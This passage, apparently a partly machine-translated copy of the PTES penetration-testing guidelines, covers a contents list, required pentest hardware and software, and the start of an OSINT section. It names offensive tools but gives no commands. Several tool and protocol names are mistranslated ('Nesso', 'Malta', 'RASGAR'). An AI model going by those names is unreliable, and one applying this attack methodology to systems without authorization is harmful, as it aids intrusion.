    - [4.2.12 Abra primeiro o caminho mais curto (OSPF)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Open_Shortest_Path_First_.28OSPF.29)
    - [4.2.13 RASGAR](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#RIP)
    - [4.2.14 Salto de VLAN](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#VLAN_Hopping)
    - [4.2.15 Protocolo de entroncamento VLAN (VTP)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#VLAN_Trunking_Protocol_.28VTP.29)
  - [4.3 Acesso RF](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#RF_Access) 
    - [4.3.1 LAN sem fio não criptografada](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Unencrypted_Wireless_LAN) 
      - [4.3.1.1 Iwconfig (Linux)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Iwconfig_.28Linux.29)
      - [4.3.1.2 Janelas (XP/7)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Windows_.28XP.2F7.29)
    - [4.3.2 Atacando o ponto de acesso](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Attacking_the_Access_Point) 
      - [4.3.2.1 Negação de serviço (DoS)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Denial_of_Service_.28DoS.29)
    - [4.3.3 Quebrando senhas](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Cracking_Passwords) 
      - [4.3.3.1 WPA-PSK/ WPA2-PSK](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#WPA-PSK.2F_WPA2-PSK)
      - [4.3.3.2 WPA/WPA2-Empresarial](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#WPA.2FWPA2-Enterprise)
    - [4.3.4 Ataques](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Attacks) 
      - [4.3.4.1 SALTO](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#LEAP) 
        - [4.3.4.1.1 Adormecido](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Asleap)
      - [4.3.4.2 802.1X](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#802.1X) 
        - [4.3.4.2.1 Ataque de distribuição de chaves](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Key_Distribution_Attack)
        - [4.3.4.2.2 Ataque de representação RADIUS](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#RADIUS_Impersonation_Attack)
      - [4.3.4.3 PEAP](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#PEAP) 
        - [4.3.4.3.1 Ataque de representação RADIUS](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#RADIUS_Impersonation_Attack_2)
        - [4.3.4.3.2 Ataque de autenticação](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Authentication_Attack)
      - [4.3.4.4 EAP-Rápido](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#EAP-Fast)
      - [4.3.4.5 WEP/WPA/WPA2](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#WEP.2FWPA.2FWPA2)
      - [4.3.4.6 Aircrack-ng](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Aircrack-ng)
  - [4.4 Atacando o usuário](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Attacking_the_User) 
    - [4.4.1 Ataques Karmetasploit](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Karmetasploit_Attacks)
    - [4.4.2 Solicitações de DNS](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#DNS_Requests)
    - [4.4.3 Bluetooth](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Bluetooth)
    - [4.4.4 AP desonesto personalizado](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Personalized_Rogue_AP)
    - [4.4.5 Rede](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Web) 
      - [4.4.5.1 Injeção SQL (SQLi)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#SQL_Injection_.28SQLi.29)
      - [4.4.5.2 XSS](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#XSS)
      - [4.4.5.3 CSRF](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#CSRF)
    - [4.4.6 Redes Ad Hoc](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Ad-Hoc_Networks)
    - [4.4.7 Desvio de detecção](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Detection_bypass)
    - [4.4.8 Resistência dos controles a ataques](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Resistance_of_Controls_to_attacks)
    - [4.4.9 Tipo de ataque](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Type_of_Attack)
    - [4.4.10 O kit de ferramentas do engenheiro social](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#The_Social-Engineer_Toolkit)
  - [4,5 Detecção de VPN](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#VPN_detection)
  - [4.6 Detecção de rotas, incluindo rotas estáticas](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Route_detection.2C_including_static_routes) 
    - [4.6.1 Protocolos de rede em uso](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Network_Protocols_in_use)
    - [4.6.2 Proxies em uso](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Proxies_in_use)
    - [4.6.3 Layout de rede](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Network_layout)
    - [4.6.4 Alvos de alto valor/perfil](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#High_value.2Fprofile_targets)
  - [4.7 Pilhagem](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Pillaging) 
    - [4.7.1 Câmeras de vídeo](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Video_Cameras)
    - [4.7.2 Exfiltração de dados](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Data_Exfiltration)
    - [4.7.3 Localizando compartilhamentos](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Locating_Shares)
    - [4.7.4 Captura de áudio](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Audio_Capture)
    - [4.7.5 Arquivos de alto valor](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#High_Value_Files)
    - [4.7.6 Enumeração de banco de dados](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Database_Enumeration)
    - [4.7.7 Wi-fi](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Wifi)
    - [4.7.8 Repositórios de código-fonte](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Source_Code_Repos)
    - [4.7.9 Git](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Git)
    - [4.7.10 Identifique aplicativos personalizados](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Identify_custom_apps)
    - [4.7.11 Cópias de segurança](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Backups)
  - [4.8 Ataques de impacto nos negócios](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Business_impact_attacks)
  - [4.9 Maior penetração na infraestrutura](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Further_penetration_into_infrastructure) 
    - [4.9.1 Girando para dentro](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Pivoting_inside) 
      - [4.9.1.1 Histórico/Registros](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#History.2FLogs)
    - [4.9.2 Limpar](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Cleanup)
  - [4.10 Persistência](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Persistence)
- [5 Pós-exploração](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Post_Exploitation) 
  - [5.1 Exploração pós-Windows](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Windows_Post_Exploitation) 
    - [5.1.1 Arquivos cegos](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Blind_Files)
    - [5.1.2 Execução de comandos não interativos](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Non_Interactive_Command_Execution)
    - [5.1.3 Sistema](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#System)
    - [5.1.4 Rede (ipconfig, netstat, net)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Networking_.28ipconfig.2C_netstat.2C_net.29)
    - [5.1.5 Configurações](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Configs)
    - [5.1.6 Encontrando arquivos importantes](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Finding_Important_Files)
    - [5.1.7 Arquivos para extrair (se possível)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Files_To_Pull_.28if_possible.29)
    - [5.1.8 Acesso remoto ao sistema](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Remote_System_Access)
    - [5.1.9 Diretórios de início automático](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Auto-Start_Directories)
    - [5.1.10 Plantio Binário](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Binary_Planting)
    - [5.1.11 Excluindo registros](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Deleting_Logs)
    - [5.1.12 Desinstalando software “Antivírus” (não interativo)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Uninstalling_Software_.E2.80.9CAntiVirus.E2.80.9D_.28Non_interactive.29)
    - [5.1.13 Outro](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Other) 
      - [5.1.13.1 Específico operacional](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Operating_Specific) 
        - [5.1.13.1.1 Win2k3](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Win2k3)
        - [5.1.13.1.2 Vista/7](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Vista.2F7)
        - [5.1.13.1.3 Vista SP1/7/2008/2008R2 (x86 e x64)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Vista_SP1.2F7.2F2008.2F2008R2_.28x86_.26_x64.29)
    - [5.1.14 Comandos invasivos ou alteradores](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Invasive_or_Altering_Commands)
    - [5.1.15 Ferramentas de suporte Binários/Links/Uso](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Support_Tools_Binaries_.2F_Links_.2F_Usage) 
      - [5.1.15.1 Várias ferramentas](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Various_tools)
  - [5.2 Obtendo hashes de senha no Windows](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Obtaining_Password_Hashes_in_Windows) 
    - [5.2.1 Injeção LSASS](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#LSASS_Injection) 
      - [5.2.1.1 Pwdump6 e Fgdump](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Pwdump6_and_Fgdump)
      - [5.2.1.2 Hashdump no Meterpreter](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Hashdump_in_Meterpreter)
    - [5.2.2 Extraindo senhas do registro](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Extracting_Passwords_from_Registry) 
      - [5.2.2.1 Copiar do Registro](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Copy_from_the_Registry)
      - [5.2.2.2 Extraindo os Hashes](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Extracting_the_Hashes)
    - [5.2.3 Extraindo senhas do registro usando Meterpreter](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Extracting_Passwords_from_Registry_using_Meterpreter)
- [6 Comunicando](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Reporting) 
  - [6.1 Relatórios de nível executivo](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Executive-Level_Reporting)
  - [6.2 Relatório Técnico](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Technical_Reporting)
  - [6.3 Quantificando o risco](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Quantifying_the_risk)
  - [6.4 Entregável](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Deliverable)
- [7 Ferramentas personalizadas desenvolvidas](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Custom_tools_developed)
- [8 Apêndice A - Criando a Política OpenVAS "Only Safe Checks"](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Appendix_A_-_Creating_OpenVAS_.22Only_Safe_Checks.22_Policy) 
  - [8.1 Em geral](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#General)
  - [8.2 Plug-ins](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Plugins)
  - [8.3 Credenciais](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Credentials)
  - [8.4 Seleção de Alvo](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Target_Selection)
  - [8,5 Regras de acesso](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Access_Rules)
  - [8.6 Preferências](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Preferences)
  - [8.7 Base de conhecimento](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Knowledge_Base)
- [9 Apêndice B - Criando a Política "Apenas Verificações Seguras"](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Appendix_B_-_Creating_the_.22Only_Safe_Checks.22_Policy) 
  - [9.1 Em geral](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#General_2)
  - [9.2 Credenciais](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Credentials_2)
  - [9.3 Plug-ins](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Plugins_2)
  - [9.4 Preferências](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Preferences_2)
- [10 Apêndice C - Criando a Política "Apenas Verificações Seguras (Web)"](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Appendix_C_-_Creating_the_.22Only_Safe_Checks_.28Web.29.22_Policy) 
  - [10.1 Em geral](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#General_3)
  - [10.2 Credenciais](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Credentials_3)
  - [10.3 Plug-ins](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Plugins_3)
  - [10.4 Preferências](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Preferences_3)
- [11 Apêndice D - Criando a Política de "Verificação de Validação"](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Appendix_D_-_Creating_the_.22Validation_Scan.22_Policy) 
  - [11.1 Em geral](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#General_4)
  - [11.2 Credenciais](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Credentials_4)
  - [11.3 Plug-ins](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Plugins_4)
  - [11.4 Preferências](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Preferences_4)
- [12 Apêndice E - Modelos padrão do NeXpose](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Appendix_E_-_NeXpose_Default_Templates) 
  - [12.1 Negação de serviço](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Denial_of_service)
  - [12.2 Varredura de descoberta](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Discovery_scan)
  - [12.3 Varredura de descoberta (agressiva)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Discovery_scan_.28aggressive.29)
  - [12.4 Exaustivo](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Exhaustive)
  - [12,5 Auditoria completa](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Full_audit)
  - [12.6 Conformidade com HIPAA](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#HIPAA_compliance)
  - [12,7 Auditoria DMZ da Internet](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Internet_DMZ_audit)
  - [12,8 RPMs do Linux](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Linux_RPMs)
  - [12,9 Correção da Microsoft](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Microsoft_hotfix)
  - [12h10 Auditoria da indústria de cartões de pagamento (PCI)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Payment_Card_Industry_.28PCI.29_audit)
  - [12.11 Teste de penetração](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Penetration_test)
  - [12.12 Teste de penetração](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Penetration_test_2)
  - [12.13 Auditoria de rede segura](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Safe_network_audit)
  - [12.14 Conformidade com Sarbanes-Oxley (SOX)](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Sarbanes-Oxley_.28SOX.29_compliance)
  - [12h15 Auditoria SCADA](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#SCADA_audit)
  - [12.16 Auditoria da web](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Web_audit)
## **Ferramentas necessárias**
A seleção das ferramentas necessárias durante um teste de penetração depende de vários fatores, como o tipo e a profundidade do envolvimento. Em termos gerais, as seguintes ferramentas são obrigatórias para realizar um teste de penetração com os resultados esperados. 
### **Sistemas operacionais**
A seleção das plataformas operacionais a serem usadas durante um teste de penetração costuma ser crítica para a exploração bem-sucedida de uma rede e do sistema associado. Como tal, é um requisito ter a capacidade de usar os três principais sistemas operacionais ao mesmo tempo. Isso não é possível sem virtualização. 
#### **Mac OS X**
MacOS X é um sistema operacional derivado do BSD. Com shells de comando padrão (como *sh* , *csh* e *bash* ) e utilitários de rede nativos que podem ser usados ​​durante um teste de penetração (incluindo *telnet* , *ftp* , *rpcinfo* , *snmpwalk* , *host* e *dig* ) é o sistema de escolha e é o sistema host subjacente para nossas ferramentas de teste de penetração. Como também se trata de uma plataforma de hardware, isso torna a seleção de hardware específico extremamente simples e garante que todas as ferramentas funcionarão conforme projetado. 
#### **Estação de trabalho VMware**
VMware Workstation é um requisito absoluto para permitir múltiplas instâncias de sistemas operacionais facilmente em uma estação de trabalho. VMware Workstation é um pacote comercial totalmente compatível e oferece recursos de criptografia e instantâneos que não estão disponíveis nas versões gratuitas disponíveis no VMware. Sem a capacidade de criptografar os dados coletados em uma VM, as informações confidenciais estarão em risco; portanto, versões que não suportam criptografia não devem ser usadas. Os sistemas operacionais listados abaixo devem ser executados como sistema convidado no VMware. 
##### **Linux**
Linux é a escolha da maioria dos consultores de segurança. A plataforma Linux é versátil e o kernel do sistema fornece suporte de baixo nível para tecnologias e protocolos de ponta. Todas as principais ferramentas de ataque e penetração baseadas em IP podem ser construídas e executadas no Linux sem problemas. Por este motivo, BackTrack é a plataforma preferida, pois vem com todas as ferramentas necessárias para realizar um teste de penetração. 
##### **WindowsXP/7**
O Windows XP/7 é necessário para o uso de determinadas ferramentas. Estão disponíveis muitas ferramentas comerciais ou ferramentas específicas de avaliação e penetração de rede da Microsoft que são executadas de forma limpa na plataforma. 
### **Ferramentas de radiofrequência**
#### **Contador de frequência**
Um contador de frequência deve cobrir de 10 Hz a 3 GHz. Um bom exemplo de contador de frequência com preço razoável é o contador de frequência MFJ-886. 
#### **Scanner de frequência**
Um scanner é um receptor de rádio que pode sintonizar ou varrer automaticamente duas ou mais frequências discretas, parando quando encontra um sinal em uma delas e continuando a varrer outras freqüências quando a transmissão inicial cessa. Eles não devem ser usados ​​na Flórida, Kentucky ou Minnesota, a menos que você seja uma pessoa que possua uma licença de rádio amador válida emitida pela Comissão Federal de Comunicações. O hardware necessário é o scanner digital portátil Uniden BCD396T Bearcat ou o scanner de entroncamento digital PSR-800 GRE. 
#### **Analisador de espectro**
Um analisador de espectro é um dispositivo usado para examinar a composição espectral de alguma forma de onda elétrica, acústica ou óptica. Um analisador de espectro é usado para determinar se um transmissor sem fio está funcionando ou não de acordo com os padrões definidos pelo governo federal e é usado para determinar, por observação direta, a largura de banda de um sinal digital ou analógico. Um bom exemplo de analisador de espectro com preço razoável é o analisador de espectro de RF Kaltman Creations HF4060. 
#### **Adaptador USB 802.11**
Um adaptador USB 802.11 permite a fácil conexão de um adaptador sem fio ao sistema de teste de penetração. Existem vários problemas com o uso de algo diferente do adaptador USB aprovado, pois nem todos suportam as funções necessárias. O hardware necessário é o USB sem fio de alta potência Alfa AWUS051NH 500mW de alto ganho 802.11a/b/g/n. 
#### **Antenas Externas**
As antenas externas vêm em vários formatos, dependendo do uso e com uma variedade de conectores. Todas as antenas externas devem possuir conectores RP-SMA compatíveis com o Alfa. Como o Alfa vem com antena omnidirecional, precisamos obter uma antena direcional. A melhor escolha é uma antena de painel, pois fornece os recursos necessários em um pacote que pode ser transportado bem. O hardware necessário é a antena de tela plana L-com 2,4 GHz 14 dBi com conector RP-SMA. Uma boa antena omnidirecional de montagem magnética, como a antena de montagem magnética Omni L-com 2,4 GHz/900 MHz 3 dBi com conector RP-SMA, é uma boa escolha. 
#### **GPS USB**
Um GPS é necessário para realizar adequadamente uma avaliação de RF. Sem isso é simplesmente impossível determinar onde e até que ponto os sinais de RF estão se propagando. Existem inúmeras opções disponíveis, portanto, você deve procurar obter um GPS USB que seja compatível com o sistema operacional que você está usando, seja Linux, Windows e Mac OS X. 
### **Programas**
Os requisitos de software baseiam-se no escopo do envolvimento, no entanto, listamos alguns softwares comerciais e de código aberto que podem ser necessários para conduzir adequadamente um teste de penetração completo. 

|**Programas**|**URL**|**Descrição**|**Somente Windows**|
| :- | :- | :- | :- |
|Malta |<http://www.paterva.com/web5>|O padrão de fato para mineração de dados sobre indivíduos e empresas. Vem em uma versão comunitária gratuita e uma versão paga. ||
|Nesso |<http://tenable.com/products/nessus>|Uma ferramenta de verificação de vulnerabilidades disponível em versões pagas e gratuitas. O Nessus é útil para encontrar e documentar vulnerabilidades principalmente dentro de uma determinada rede. ||
|IBM AppScan |<http://www-01.ibm.com/software/awdtools/appscan>|IBM's automated Web application security testing suite. |**\***|
|eEye Retina |<http://www.eeye.com/Products/Retina.aspx>|Retina is an an automated network vulnerability scanner that can be managed from a single web-based console. It can be used in conjunction with Metasploit where if an exploit exists in Metasploit, it can be launched directly from Retina to verify that the vulnerability exists. ||
|Nexpose |[http://www.rapid7.com](http://www.rapid7.com/)|Nexpose is a vulnerability scanner from the same company that brings you Metasploit. Available in both free and paid versions that differ in levels of support and features. ||
|OpenVAS |[http://www.openvas.org](http://www.openvas.org/)|OpenVAS is a vulnerability scanner that originally started as a fork of the Nessus project. The actual security scanner is accompanied with a daily updated feed of Network Vulnerability Tests (NVTs), over 20,000 in total (as of January 2011) ||
|HP WebInspect |<https://www.fortify.com/products/web_inspect.html>|HP WebInspect performs web application security testing and assessment for complex web applications. Supports JavaScript, Flash, Silverlight and others. |**\***|
|HP SWFScan |<https://h30406.www3.hp.com/campaigns/2009/wwcampaign/1-5TUVE/index.php?key=swf>|HP SWFScan is a free tool developed by HP Web Security Research Group to automatically find security vulnerabilities in applications built on the Flash platform. Useful for decompiling flash apps and finding hard-coded credentials, etc. |**\***|
|Backtrack Linux |[\[1\]](http://www.backtrack-linux.org/)|One of the most complete penetration testing Linux distributions available. Includes many of the more popular free pentesting tools but is based on Ubuntu so it's also easily expandable. Can be run on Live CD, USB key, VM or installed on a hard drive. ||
|SamuraiWTF (Web Testing Framework) |[http://samurai.inguardians.com](http://samurai.inguardians.com/)|A live Linux distribution built for the specific purpose of web application scanning. Includes tools such as Fierce, Maltego, WebScarab, BeEF any many more tools specific to web application testing. ||
|SiteDigger |<http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx>|SiteDigger 3.0 is a free tool that runs on Windows. It searches Google’s cache to look for vulnerabilities, errors, configuration issues, proprietary information, and interesting security nuggets on web sites. |**\***|
|FOCA |<http://www.informatica64.com/DownloadFOCA>|FOCA is a tool that allows you to find out more about a website by (amongst other things) analysing the metadata in any documents it makes available. |**\***|
|THC IPv6 Attack Toolkit |<http://www.thc.org/thc-ipv6>|The largest single collection of tools designed to exploit vulnerabilities in the IPv6 and ICMP6 protocols. ||
|THC Hydra |<http://thc.org/thc-hydra/>|Hydra is a very fast network logon brute force cracker which can attack many different services and resources. |**\***|
|Cain |<http://www.oxid.it/cain.html>|Cain & Abel is a password recovery tool that runs on Windows. It allows easy recovery of various kind of passwords by sniffing the network, cracking encrypted passwords using Dictionary, Brute-Force and Cryptanalysis attacks, recording VoIP conversations, decoding scrambled passwords, recovering wireless network keys, revealing password boxes, uncovering cached passwords and analyzing routing protocols. |**\***|
|cree.py |<http://ilektrojohn.github.com/creepy/>|cree.py gathers geolocation related information from social networking platforms and image hosting services. Then the information is presented in a map where all the retrieved data is shown accompanied with relevant information (i.e. what was posted from that specific location) to provide context. ||
|inSSIDer |<http://www.metageek.net/products/inssider>|inSSIDer is a free gui-based wifi discovery and troubleshooting tool for Windows |**\***|
|Kismet Newcore |[http://www.kismetwireless.net](http://www.kismetwireless.net/)|Kismet is an 802.11 layer2 wireless network detector, sniffer, and intrusion detection system. Kismet passively collects packets from both named and hidden networks with any wireless adapter that supports raw monitor mode. ||
|Rainbow Crack |[http://project-rainbowcrack.com](http://project-rainbowcrack.com/)|Rainbow Crack is a password cracker that will run a pre-computed rainbow table against a given series of hashes. ||
|dnsenum |<http://code.google.com/p/dnsenum>|Think of dnsenum as a supercharged version of a whois query. It not only discovers all of the dns records but it goes a step further and attempts to use google to discover subdomains, discovers BIND versions and more. ||
|dnsmap |<http://code.google.com/p/dnsmap>|Dnsmap is a passive dns mapper that is used for subdomain bruteforce discovery. ||
|dnsrecon |<http://www.darkoperator.com/tools-and-scripts/>|DNS enumeration script written in ruby for performing TLD expansion, SRV record enumeration, host and subdomain brute force, zone transfer, reverse lookup and general record identification. ||
|dnstracer |<http://www.mavetju.org/unix/dnstracer.php>|dnstracer determines where a given Domain Name Server (DNS) gets its information from and follows the chain of DNS servers back to the servers which know the data. ||
|dnswalk |<http://sourceforge.net/projects/dnswalk>|Dnswalk is a DNS debugger. It performs zone transfers of specified domains, and checks the database in numerous ways for internal consistency, as well as accuracy. ||
|Fierce |<http://ha.ckers.org/fierce>|Fierce domain scan discovers non-contiguous IP ranges of a network. ||
|Fierce2 |<http://trac.assembla.com/fierce/>|Fierce 2 is an updated version that is maintained by a new group of developers. ||
|FindDomains |<http://code.google.com/p/finddomains>|FindDomains is a multithreaded search engine discovery tool that will be very useful for penetration testers dealing with discovering domain names/web sites/virtual hosts which are located on too many IP addresses. Provides a console interface so you can easily integrate this tool to your pentesting automation system. |**\***|
|HostMap |[http://hostmap.lonerunners.net](http://hostmap.lonerunners.net/)|hostmap is a free and automatic tool that enables the discovery of all hostnames and virtual hosts on a given IP address. ||
|URLcrazy |<http://www.morningstarsecurity.com/research/urlcrazy>|URLCrazy is a domainname typo generator. This will allow you to find squatted domains related to your target company and possibly generate some of your own. ||
|theHarvester |<http://www.edge-security.com/theHarvester.php>|theHarvester is a tool for gathering e-mail accounts, user names and hostnames/subdomains from different public sources like search engines and PGP key servers. ||
|The Metasploit Framework |[http://metasploit.com](http://metasploit.com/)|Metasploit is an ever-growing collection of remote exploits and post exploitation tools for all platforms. You will want to constantly run svn updates on this tool since new features and exploits are added nearly daily. Metasploit is both incredibly powerful and complex. For further guidance, check out this book <http://nostarch.com/metasploit.htm> . ||
|The Social-Engineer Toolkit (SET) |<http://www.secmaniac.com/download/>|The Social-Engineer Toolkit (SET) is specifically designed to perform advanced attacks against the human element. Amongst other things, SET allows you to craft malcious emails and dummy websites based on legitimate ones to compliment a social engineering attack. ||
|Fast-Track |<http://www.secmaniac.com/download/>|Fast-Track is an automated pentesting tool suite. Many of the issues Fast-Track exploits are due to improper sanitizing of client-side data within web applications, patch management, or lack of hardening techniques. It runs on Linux and depends on Metasploit 3. ||

## **Intelligence Gathering**
Intelligence Gathering is the phase where data or "intelligence" is gathered to assist in guiding the assessment actions. At the broadest level this intelligence gathering includes information about employees, facilities, products and plans. Within a larger picture this intelligence will include potentially secret or private "intelligence" of a competitor, or information that is otherwise relevant to the target. 
### **OSINT**
Open Source Intelligence (OSINT) in the simplest of terms is locating, and analyzing publically (open) available sources of information. The key component here is that this intelligence gathering process has a goal of producing current and relevant information that is valuable to either an attacker or competitor. For the most part, OSINT is more than simply performing web searches using various sources. 
#### **Corporate**
Information on a particular target should include information regarding the legal entity. Most states within the US require Corporations, limited liability companies and limited partnerships to file with the State division. This division serves as custodian of the filings and maintains copies and/or certifications of the documents and filings. This information may contain information regarding shareholders, members, officers or other persons involved in the target entity. 

|**State**|**URL**|
| :- | :- |
|Alabama |<http://sos.alabama.gov/BusinessServices/NameRegistration.aspx>|
|Alaska |<http://www.dced.state.ak.us/bsc/corps.htm>|
|Arizona |<http://starpas.azcc.gov/scripts/cgiip.exe/WService=wsbroker1/main.p>|
|Arkansas |<http://www.sosweb.state.ar.us/corps/incorp>|
|California |<http://kepler.sos.ca.gov/>|
|Colorado |[http://www.state.co.us](http://www.state.co.us/)|
|Connecticut |[http://www.state.ct.us](http://www.state.ct.us/)|
|Delaware |[http://www.state.de.us](http://www.state.de.us/)|
|District of Columbia |[http://www.ci.washington.dc.us](http://www.ci.washington.dc.us/)|
|Florida |<http://www.sunbiz.org/search.html>|
|Georgia |<http://corp.sos.state.ga.us/corp/soskb/CSearch.asp>|
|Hawaii |[http://www.state.hi.us](http://www.state.hi.us/)|
